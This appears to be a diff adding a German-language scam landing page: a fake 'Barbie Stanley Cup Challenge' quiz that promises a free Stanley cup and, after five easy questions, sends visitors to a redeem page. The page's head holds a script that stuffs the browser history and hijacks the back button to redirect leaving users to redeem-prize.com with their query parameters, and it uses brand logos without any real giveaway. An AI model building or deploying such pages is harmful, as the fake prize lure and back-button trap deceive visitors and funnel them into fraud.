@@ -1,0 +1,271 @@
+<!DOCTYPE html><html lang="de"><head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="robots" content="noindex, nofollow">
+    <title>Barbie Challenge - Stanley Cup Preis</title>
+
+    <!-- Google Fonts -->
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin="">
+    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;700&amp;display=swap" rel="stylesheet">
+    <script>
+        // ÄNDERN SIE DEN LINK ZUR SEITE, DIE ANGEZEIGT WERDEN SOLL, WENN DER BENUTZER VERSUCHT, DIE SEITE ZU VERLASSEN
+        const link = 'https://www.redeem-prize.com/';
+      
+        function setBackRedirect(url) {
+          let urlBackRedirect = url;
+          urlBackRedirect = urlBackRedirect =
+            urlBackRedirect.trim() +
+            (urlBackRedirect.indexOf('?') > 0 ? '&' : '?') +
+            document.location.search.replace('?', '').toString();
+      
+          history.pushState({}, '', location.href);
+          history.pushState({}, '', location.href);
+          history.pushState({}, '', location.href);
+      
+          window.addEventListener('popstate', () => {
+            console.log('onpopstate', urlBackRedirect);
+            setTimeout(() => {
+              location.href = urlBackRedirect;
+            }, 1);
+          });
+        }
+      
+        setBackRedirect(link);
+      </script>
+    <!-- Optimierte Styles -->
+    <style>
+        body {
+            font-family: 'Roboto', sans-serif;
+            margin: 0;
+            padding: 0;
+            background-color: #f4f4f4;
+            color: #333;
+        }
+
+        .header {
+            background-color: #fff;
+            padding: 20px;
+            text-align: center;
+        }
+
+        .header img {
+            width: 150px;
+        }
+
+        .container {
+            background-color: white;
+            max-width: 600px;
+            margin: 20px auto;
+            border-radius: 10px;
+            padding: 20px;
+            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
+            text-align: center;
+        }
+
+        h2 {
+            color: #e91e63;
+            margin-bottom: 20px;
+        }
+
+        p {
+            font-size: 18px;
+            line-height: 1.6;
+            margin-bottom: 20px;
+        }
+
+        .btn {
+            display: inline-block;
+            padding: 15px 30px;
+            background-color: #002ec6;
+            color: white;
+            text-decoration: none;
+            border-radius: 5px;
+            font-size: 18px;
+            transition: background-color 0.3s ease;
+            margin-top: 15px;
+        }
+
+        .btn:hover {
+            background-color: #001a80;
+        }
+
+        img {
+            width: 100%;
+            height: auto;
+            border-radius: 10px;
+        }
+
+        .strong {
+            font-weight: 700;
+            color: #333;
+        }
+
+        .progress-bar {
+            background-color: #ddd;
+            border-radius: 5px;
+            overflow: hidden;
+            height: 20px;
+            width: 100%;
+            margin: 20px 0;
+        }
+
+        .progress {
+            background-color: #e91e63;
+            height: 100%;
+            width: 0%;
+            transition: width 0.4s ease;
+        }
+
+        .question {
+            margin: 20px 0;
+        }
+
+        .btn-answer {
+            display: block;
+            padding: 10px;
+            background-color: #f1f1f1;
+            margin: 10px 0;
+            border-radius: 5px;
+            cursor: pointer;
+            transition: background-color 0.3s ease;
+        }
+
+        .btn-answer:hover {
+            background-color: #ddd;
+        }
+
+        /* Fehlermeldung */
+        .error-message {
+            display: none;
+            color: #d32f2f;
+            background-color: #ffebee;
+            padding: 10px;
+            border-radius: 5px;
+            margin-top: 20px;
+            border: 1px solid #d32f2f;
+        }
+
+        /* Kleinere Bildgröße */
+        .product-image {
+            width: 70%;
+            max-width: 400px;
+            margin: 0 auto;
+        }
+    </style>
+</head>
+
+<body>
+
+    <!-- Kopfbereich -->
+    <div class="header">
+        <img src="images/stanley-logo-9CF02872EA-seeklogo.com.png" alt="Stanley Logo">
+    </div>
+
+    <!-- Hauptinhalt -->
+    <div class="container">
+        <h2>WILLKOMMEN BEIM BARBIE STANLEY CUP CHALLENGE!</h2>
+
+        <img src="images/Untitled-design-29.jpg" alt="Barbie Stanley Cup" class="product-image" loading="lazy">
+
+        <p id="question-text">Nehmen Sie an der <strong class="strong">Barbie Stanley Cup Challenge</strong> teil und gewinnen Sie einen exklusiven Stanley Cup!</p>
+
+        <!-- Fortschrittsbalken -->
+        <div class="progress-bar">
+            <div class="progress" id="progress" style="width: 20%;"></div>
+        </div>
+
+        <!-- Fragen -->
+        <div class="question" id="question-container">
+            <p id="question-title">Was ist die Hauptbotschaft der Barbie-Kampagne?</p>
+            <div class="btn-answer" onclick="checkAnswer(0)">Eine Mode-Revolution</div>
+            <div class="btn-answer" onclick="checkAnswer(1)">Mädchen zu großen Träumen inspirieren</div>
+            <div class="btn-answer" onclick="checkAnswer(2)">Werbung für eine neue Puppenkollektion</div>
+        </div>
+
+        <!-- Fehlermeldung -->
+        <div id="error-message" class="error-message" style="display: none;">Falsche Antwort! Bitte versuchen Sie es erneut.</div>
+
+        <!-- Abschluss-Button -->
+        <a href="./redeem/index.html" id="final-btn" class="btn" style="display: none;">HERAUSFORDERUNG ABSCHLIESSEN</a>
+    </div>
+
+    <!-- JS Script -->
+    <script defer="">
+        const questions = [
+            {
+                question: "Was ist die Hauptbotschaft der Barbie-Kampagne?",
+                answers: ["Eine Mode-Revolution", "Mädchen zu großen Träumen inspirieren", "Werbung für eine neue Puppenkollektion"],
+                correct: 1
+            },
+            {
+                question: "Wie fördert Barbie Selbstbewusstsein?",
+                answers: ["Durch Puppen-Makeovers", "Durch positive Vorbilder", "Durch Social-Media-Herausforderungen"],
+                correct: 1
+            },
+            {
+                question: "Was symbolisiert die Farbe Pink bei Barbie?",
+                answers: ["Selbstliebe und Empowerment", "Trends setzen", "Spaß und Abenteuer"],
+                correct: 0
+            },
+            {
+                question: "Welche Altersgruppe spricht die Barbie-Kampagne an?",
+                answers: ["Nur Kinder", "Teenager und Erwachsene", "Alle Altersgruppen"],
+                correct: 2
+            },
+            {
+                question: "Wohin fließen die Mittel aus dieser Herausforderung?",
+                answers: ["Mode-Kampagnen", "Mädchen zu stärken Initiativen", "Social-Media-Werbung"],
+                correct: 1
+            }
+        ];
+
+        let currentQuestion = 0;
+        const totalQuestions = questions.length;
+
+        const questionContainer = document.getElementById('question-container');
+        const questionTitle = document.getElementById('question-title');
+        const progress = document.getElementById('progress');
+        const finalBtn = document.getElementById('final-btn');
+        const questionText = document.getElementById('question-text');
+        const errorMessage = document.getElementById('error-message');
+
+        function loadQuestion(index) {
+            const q = questions[index];
+            questionTitle.textContent = q.question;
+            const btnAnswers = document.querySelectorAll('.btn-answer');
+            btnAnswers.forEach((btn, i) => {
+                btn.textContent = q.answers[i];
+                btn.setAttribute('onclick', `checkAnswer(${i})`);
+            });
+
+            const progressPercentage = ((index + 1) / totalQuestions) * 100;
+            progress.style.width = progressPercentage + '%';
+            errorMessage.style.display = 'none';
+        }
+
+        function checkAnswer(selected) {
+            if (selected === questions[currentQuestion].correct) {
+                currentQuestion++;
+                if (currentQuestion < totalQuestions) {
+                    loadQuestion(currentQuestion);
+                } else {
+                    showFinalMessage();
+                }
+            } else {
+                errorMessage.style.display = 'block';
+            }
+        }
+
+        function showFinalMessage() {
+            questionText.textContent = "Glückwunsch! Sie haben die Barbie Stanley Cup Challenge abgeschlossen und Ihren exklusiven Cup verdient!";
+            questionContainer.style.display = 'none';
+            errorMessage.style.display = 'none';
+            finalBtn.style.display = 'block';
+        }
+
+        loadQuestion(currentQuestion);
+    </script>
+
+
+
+</body></html>
